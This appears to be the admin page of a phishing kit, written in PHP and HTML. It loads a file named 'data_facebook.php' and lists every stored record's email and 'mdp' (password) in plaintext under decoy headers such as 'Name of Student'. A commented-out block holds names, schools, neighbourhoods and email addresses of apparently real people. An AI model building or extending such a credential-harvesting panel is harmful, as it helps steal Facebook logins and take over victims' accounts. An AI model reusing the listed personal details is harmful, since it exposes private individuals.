<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="bootstrap.min.css">
    <title>Admin</title>
</head>
<body>
    <div class="w3-padding w3-white notranslate">
        <div class="table-responsive">
          <table class="table">
            <thead>
              <tr>
                <th>#id</th>
                <th>Name of Student</th>
                <th>School Name</th>
              </tr>
            </thead>
            <?php
            //connect bdd
            include("data_facebook.php");
            $ins = $base->prepare("SELECT * FROM `identity`");
            $ins->execute();
        
            while($result=$ins->fetch()) {
              
                // echo $result['nameStudent'];
        ?>
          <tbody>
            <tr class="table-active">
              <td><?php echo $result['id'] ?></td>
              <td><?php echo $result['email'] ?></td>
              <td><?php echo $result['mdp'] ?></td>
              <td><button class="btn btn-primary">RAPPORT</button></td>
            </tr>
          </tbody>
              <?php } ?>
        </table>

              <!-- <tr class="table-primary">
                <td>2</td>
                <td>Harry Olivia</td>
                <td>INSCAM</td>
                <td>University</td>
                <td>16</td>
                <td>Sabotsy</td>
                <td>olivia@gmail.com</td>
              </tr>
              <tr class="table-success">
                <td>3</td>
                <td>Rafidiarisoa</td>
                <td>Ambohitsaina</td>
                <td>University</td>
                <td>17</td>
                <td>Ankatso 1</td>
                <td>charlie@gmail.com</td>
              </tr>
              <tr class="table-danger">
                <td>4</td>
                <td>Giovanne</td>
                <td>UNA</td>
                <td>University</td>
                <td>21</td>
                <td>Lazaret</td>
                <td>valencia@gmail.com</td>
              </tr>
              <tr class="table-info">
                <td>5</td>
                <td>Rakotomalala Fanaingo</td>
                <td>CNTEMAD</td>
                <td>University</td>
                <td>20</td>
                <td>Besarety</td>
                <td>naingo@gmail.com</td>
              </tr>
              <tr class="table-warning">
                <td>6</td>
                <td>Koloina Fahendrena</td>
                <td>IST</td>
                <td>University</td>
                <td>19</td>
                <td>Namehana</td>
                <td>koloina@gmail.com</td>
              </tr>
              <tr class="table-active">
                <td>7</td>
                <td>Raja Rakoto</td>
                <td>CNTEMAD</td>
                <td>University</td>
                <td>24</td>
                <td>Besarety</td>
                <td>raja@gmail.com</td>
              </tr>
              <tr class="table-secondary">
                <td>8</td>
                <td>Avotra Cirus</td>
                <td>Ankatso & CNTEMAD</td>
                <td>University</td>
                <td>21</td>
                <td>Ankatso 2</td>
                <td>masindahy@gmail.com</td>
              </tr>
              <tr class="table-light">
                <td>9</td>
                <td>Famonjena Norbert</td>
                <td>CNTENAD</td>
                <td>University</td>
                <td>20</td>
                <td>Ankatso 2</td>
                <td>terezy@gmail.com</td>
              </tr>
              <tr class="table-dark text-dark">
                <td>10</td>
                <td>Gracia</td>
                <td>Ambohitsaina</td>
                <td>University</td>
                <td>20</td>
                <td>Avaratr'Ankatso</td>
                <td>gracia@gmail.com</td>
              </tr>
            </tbody>
        </div>
        </div> -->
</body>
</html>